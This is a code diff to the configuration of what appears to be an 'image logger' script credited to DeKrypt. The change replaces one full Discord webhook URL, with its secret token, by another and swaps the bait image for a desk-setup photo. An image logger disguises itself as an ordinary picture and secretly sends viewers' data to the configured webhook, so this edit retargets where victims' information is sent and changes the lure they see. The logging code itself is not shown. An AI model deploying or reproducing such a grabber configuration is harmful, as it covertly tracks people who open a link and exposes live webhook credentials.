@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1362182550717595699/sAfZfTg4R1JU6PsEG8GYjSLi0zF0RR3JUGfFOIw8IwFPO3hwINDsIXr0O5TMVItfKcC9",
-    "image": "https://c4.wallpaperflare.com/wallpaper/862/266/461/grand-theft-auto-v-fivem-mitsubishi-evolution-mitsubishi-lancer-evo-x-hd-wallpaper-preview.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1363652264803303444/A4zQAxiJUKmiFz2DXFiBRk0HVRHizmNgad5XT-NgaphYqhPsg5lkif0H3iOU3iSVwWRC",
+    "image": "https://www.dandrelectronix.com/wp-content/uploads/2024/08/Desktop-setup.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
